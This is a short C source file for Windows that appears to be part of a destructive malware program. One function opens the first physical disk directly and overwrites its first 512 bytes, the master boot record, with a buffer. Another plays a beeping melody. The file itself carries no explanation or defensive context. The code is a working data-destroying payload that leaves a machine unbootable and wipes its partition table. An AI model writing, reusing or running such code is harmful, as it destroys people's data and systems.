#include "dec.h"

BYTE mbrData[512];

int MBRWrite() {
    HANDLE device = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    WriteFile(device, mbrData, 512, NULL, NULL);
    CloseHandle(device);

    return 0;
}

int Final() {
	for (int i = 0; i < 2; i++) {
		Beep(261, 375);
		Beep(329, 750);
		Beep(493, 750);
		Beep(587, 750);
		Beep(493, 750);
		Beep(523, 750);
		Beep(493, 750);
		Beep(391, 375);
		Beep(440, 375);
		Beep(391, 375);
		Beep(164, 375);
		Beep(195, 750);
		Beep(369, 750);
		Beep(293, 750);
		Beep(246, 375);
		Beep(184, 375);
		Beep(220, 750);
		Beep(440, 750);
		Beep(329, 750);
		Beep(246, 375);
	}
}